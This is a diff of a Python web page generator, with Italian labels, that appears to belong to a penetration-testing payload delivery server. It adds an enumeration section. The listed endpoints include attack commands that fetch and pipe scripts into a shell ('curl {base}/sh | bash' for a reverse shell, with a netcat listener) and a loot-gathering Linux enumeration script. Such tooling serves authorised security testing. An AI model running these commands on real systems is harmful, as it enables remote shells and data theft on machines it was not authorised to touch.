@@ -4413,6 +4413,8 @@ def _page_delivery() -> str:
         ("sh", "Reverse Shell Python", "One-liner Python3 per reverse shell (utile quando bash non ha /dev/tcp)",
          f"curl {base}/sh | bash",
          f"Prerequisito: <code>nc -lvnp {_lport}</code>"),
+    ]
+    enum_endpoints = [
         ("static/linseal.sh", "LinSeal", "Enumerazione Linux leggera — alternativa a linpeas, zero broken pipe. Opzioni: ?o salva output, ?ol output+loot, ?ols silenzioso+loot",
          f"curl {base}/linseal?ol | sh",
          "Nessun prerequisito — POSIX sh puro"),
@@ -4422,6 +4424,15 @@ def _page_delivery() -> str:
     ]
     for key, title, desc, curl_cmd, prereq in endpoints:
         ep_cards += f"""<div class="delivery-card">
+<div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span></div>
+<div class="dc-desc">{desc}</div>
+<div class="dc-cmd"><code>{html.escape(curl_cmd)}</code></div>
+<div class="dc-prereq">{prereq}</div>
+</div>\n"""
+
+    enum_cards = ""
+    for key, title, desc, curl_cmd, prereq in enum_endpoints:
+        enum_cards += f"""<div class="delivery-card">
 <div class="dc-header"><span class="dc-endpoint">/{key}</span><span class="dc-title">{title}</span></div>
 <div class="dc-desc">{desc}</div>
 <div class="dc-cmd"><code>{html.escape(curl_cmd)}</code></div>
@@ -4514,6 +4525,8 @@ wsUpdate();
 <h3 style="margin:24px 0 12px;color:var(--text)">Endpoint dinamici</h3>
 {ep_cards}
 {webshell_card}
+<h3 style="margin:24px 0 12px;color:var(--text)">Enum</h3>
+{enum_cards}
 <h3 style="margin:24px 0 12px;color:var(--text)">File statici ({len(files)})</h3>
 <div class="table-scroll">
 <table class="log-table" style="font-size:13px">
